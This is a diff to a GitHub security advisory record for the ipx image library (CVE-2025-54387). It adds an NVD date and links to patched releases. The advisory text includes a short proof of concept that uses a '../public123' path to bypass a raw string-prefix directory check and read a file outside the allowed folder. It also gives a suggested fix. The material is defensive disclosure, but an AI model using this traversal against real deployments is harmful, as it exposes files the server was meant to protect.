@@ -79,17 +79,21 @@
     ],
     "github_reviewed": true,
     "github_reviewed_at": "2025-08-04T14:48:25Z",
-    "nvd_published_at": null,
+    "nvd_published_at": "2025-08-05T01:15:41Z",
     "severity": "MODERATE"
   },
   "details": "### Summary\n\nThe approach used to check whether a path is within allowed directories is vulnerable to path prefix bypass when the allowed directories do not end with a path separator. This occurs because the check relies on a raw string prefix comparison.\n\n\n### PoC\n\n- setup\n```\nmkdir ~/public123\nmove a png file under ~/public123 with name test.png\ncd\nnpm i ipx \n```\n\n- `main.js`\n```js\nimport { createIPX, ipxFSStorage } from \"ipx\";\n\nconst ipx = createIPX({\n  storage: ipxFSStorage({ dir: \"./public\" }),\n});\n\n\n(async () => { \n    {\n        const source = await ipx(\"../public123/test.png\"); // access file outside ./public dir because of same prefix folder\n        const { data, format } = await source.process();\n        console.log(format) // print image data\n    }\n    {\n        try {\n            const source = await ipx(\"../publi123/test.png\"); // forbidden path: the prefix is not the same\n            const { data, format } = await source.process();\n            console.log(data)\n        } catch (err) {\n            console.log(err.message) // Forbidden path:\n        }\n\n    }\n\n})()\n```\n\n- `node main.js`\n```\npng\nForbidden path: /../publi123/test.png\n```\n\n### Impact\nPath Traversal\n\n### Possible Fix\n\nCheck if the `dir` ends with `/` (path separator) and if not, add before calling `startsWith`",
   "id": "GHSA-mm3p-j368-7jcr",
-  "modified": "2025-08-04T15:42:15.675764Z",
+  "modified": "2025-08-05T17:10:13Z",
   "published": "2025-08-04T14:48:25Z",
   "references": [
     {
       "type": "WEB",
       "url": "https://github.com/unjs/ipx/security/advisories/GHSA-mm3p-j368-7jcr"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-54387"
     },
     {
       "type": "WEB",
@@ -98,6 +102,18 @@
     {
       "type": "PACKAGE",
       "url": "https://github.com/unjs/ipx"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/unjs/ipx/releases/tag/v1.3.2"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/unjs/ipx/releases/tag/v2.1.1"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/unjs/ipx/releases/tag/v3.1.1"
     }
   ],
   "schema_version": "1.7.0",
